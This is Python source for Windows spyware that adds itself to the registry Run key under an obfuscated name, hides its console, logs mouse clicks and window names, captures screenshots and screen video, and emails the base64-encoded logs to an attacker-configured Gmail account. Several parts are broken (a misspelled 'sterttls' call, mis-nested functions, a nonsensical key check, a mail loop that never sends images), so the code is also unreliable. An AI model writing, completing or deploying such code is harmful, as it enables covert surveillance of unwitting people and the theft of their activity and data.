#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket 
import sys
import keyboard
import os
import time 
import random 
import smtplib
import string
import base64
import win32api
import pythoncom
import pyautogui
import numpy as np
import cv2




from winreg import *

global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval

t="";pics_names=[]

#Remember to edit this so that you dont send keylogger to person
#settings

yourgmail = ""                #gmail?
yourgmailpass = ""            #gmail password?
sendto = ""                   #Send the logs to?
# interval = 30                 #Time to wait before sending data to email(in seconds)

#settings

try:

    f = open('Logfile.txt', 'a')
    f.close()
except:

    f = open('Logfile.txt', 'w')
    f.close()


def addStartup(): # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx (key2change, 'Howcelmzexpla27831910', 0, REG_SZ, new_file_path)
                            #gDHwodhqoueSs07423933
def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

addStartup()

Hide()


def Screenshot():
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    
    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')

def Mail_it (data, pics_names):
    data = base64.b64encode(data)
    data = 'New data from person(Base64 encoded)\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(yourgmail, yourgmailpass)
    server.sendmail(yourgmail, sendto, data)
    server.close()

    for pic in pics_names:
        data = base64.b64encode(data)
        data = 'New pic data from person(Base64 encoded)\n'+ data
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.sterttls()
        server.login(yourgmail, yourgmailpass)
        server.close()

#screenshot section

        def OnMouseEvent(event):
            global yourgmail, yourgmailpass, sendto, interval
            data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
                + ' Windowname : ' + str(event.WindowName)
            data += '\n\ tButton :' + str(event.MessageName)
            data += '\n\tClicked in (Position):' + str(event.Position)
            data += '\n==================='
            global t, start_time, pics_names 
            t = t + data

            if len(t) > 300:
                Screenshot()

            if len(t) > 500:
                f = open ('Logfile.txt', 'a')
                f.write(t)
                f.close() 
                t = ''

            if int(time.time() - start_time) == int(interval):
                Mail_it(t, pics_names)  
                t = ''
            return()

#screen recording section
            

resolution = (1920, 1080)

#the video codec type
codec = cv2.VideoWriter_fourcc(*"XVID")

#dump file for video recording that has been capped
filename = "Recording.avi"

#the frame rate of the recording
fps = 30

time = 10

#VideoWriter creation 
out = cv2.VideoWriter(filename, codec, fps, resolution)

#Empty window
cv2.namedWindow("Live", cv2.WINDOW_NORMAL)

#Window resizing
cv2.resizeWindow("Live", 480, 270)

while True:

    #screenshots with pyautogui
    img = pyautogui.screenshot()

    #Convert screenshot into an array with numpy
    frame = np.array(img)

    #Conversion from BGR coloring to RGB
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

    #writes to the output files
    out.write(frame)

    #Displays the REC screen
    cv2.imshow('Live', frame)

    #Order to stop REC when q is pressed
    cv2.waitKey(1) == 'ord ('f')'
    break

# releases vid writer
out.release()

#Remove all windows
cv2.destroyAllWindows()


